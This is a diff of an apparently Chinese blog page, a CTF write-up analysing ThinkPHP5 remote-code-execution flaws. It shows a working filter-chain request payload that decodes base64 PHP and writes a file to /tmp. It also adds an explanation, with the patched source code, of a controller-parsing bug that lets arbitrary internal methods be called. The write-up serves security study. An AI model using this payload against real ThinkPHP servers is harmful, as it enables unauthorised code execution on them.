@@ -93,8 +93,12 @@
 <meta property="og:image" content="https://i.loli.net/2020/10/24/5foFyYApnQJ8bzD.png">
 <meta property="og:image" content="https://i.loli.net/2020/10/29/WPTNtM5c4EmXIHD.png">
 <meta property="og:image" content="https://i.loli.net/2020/10/30/TEf3zDHmFJwGncA.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/02/xVJoMkln7RuK9id.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/02/KkLsQBdhIunJUOW.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/02/ZloDU1wPMj2rnBk.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/02/K1TxLStXvVhHY5e.png">
 <meta property="article:published_time" content="2020-10-22T15:26:06.000Z">
-<meta property="article:modified_time" content="2020-11-02T13:28:15.744Z">
+<meta property="article:modified_time" content="2020-11-02T15:44:06.860Z">
 <meta property="article:author" content="star">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="thinkphp5">
@@ -415,6 +419,21 @@
   5. 这个做法的关键是在于在appError抑制向外抛出错误，还有一种做法就是关闭error_reporting，将其设为0即可，还是设置下参数的位置，第一个参数为0就好。error_reporting(0)=&gt;self::path(xxx)=&gt;后面都一样了。
 
      <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;0&amp;filter[]&#x3D;error_reporting&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\think\view\driver\Php::Display&amp;method&#x3D;GET&amp;path&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoIi90bXAvdGVzdC5waHAiLCI8P3BocCBlaGNvIG1kNSgxKTs%2FPiIpOz8%2BCg%3D%3D&amp;_method&#x3D;__construct</span><br></pre></td></tr></table></figure></code></pre>
+<ol start="3">
+<li><p>Tp5.0，5.1下面的另外一个rce，这个主要是由于对控制器解析的错误引起的。</p>
+<p><code>[library/think/route/dispatch/Module.php](https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815#diff-1a244c60299c5674fbeee4a6165f84512bdb109c080509b7f951b5353e47d876) </code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 是否自动转换控制器和操作名</span></span><br><span class="line"><span class="comment">//$convert = is_bool($this-&gt;convert) ? $this-&gt;convert : $this-&gt;rule-&gt;getConfig('url_convert');</span></span><br><span class="line"><span class="comment">// 获取控制器名</span></span><br><span class="line">$controller       = strip_tags($result[<span class="number">1</span>] ?: <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'default_controller'</span>));</span><br><span class="line">$controller = strip_tags($result[<span class="number">1</span>] ?: <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'default_controller'</span>));</span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^[A-Za-z](\w)*$/'</span>, $controller)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $controller);</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line"><span class="keyword">$this</span>-&gt;controller = $convert ? strtolower($controller) : $controller;</span><br></pre></td></tr></table></figure>
+
+<p>被注释掉的是，原本的代码。</p>
+<p>我们简单地跟一下</p>
+<p><img src="https://i.loli.net/2020/11/02/xVJoMkln7RuK9id.png"></p>
+<p>跟进去发现直接根据/来区分controller和action，然后controller又是任意加载的，这样很容易调用任意内部方法。</p>
+<p><img src="https://i.loli.net/2020/11/02/KkLsQBdhIunJUOW.png"></p>
+<p><img src="https://i.loli.net/2020/11/02/ZloDU1wPMj2rnBk.png"></p>
+<p><img src="https://i.loli.net/2020/11/02/K1TxLStXvVhHY5e.png"></p>
+<p>获取controller名和action名，实现任意内部方法调用。</p>
+</li>
+</ol>
 <h2 id="小小的反思"><a href="#小小的反思" class="headerlink" title="小小的反思"></a>小小的反思</h2><p>这题没出的一个很大的原因是思路没有及时切换过来，tp中的静态方法甚至动态方法都应该是可以利用的对象。赛后分析来说，很多例子都相当有意思，尤其是第五个做法。实际上简单地搜索了下，还有几个动态的include方法可以利用，但是正常情况下采取直接利用__include_file即可，所以看上去没啥用。然而虽然没出这道题，但是赛后的复现和查文档还是能让我学到了足够多的东西，这点大概是最令人欣慰的吧。</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
 <li><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part2/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md" target="_blank" rel="noopener">thinkphpVul</a></li>
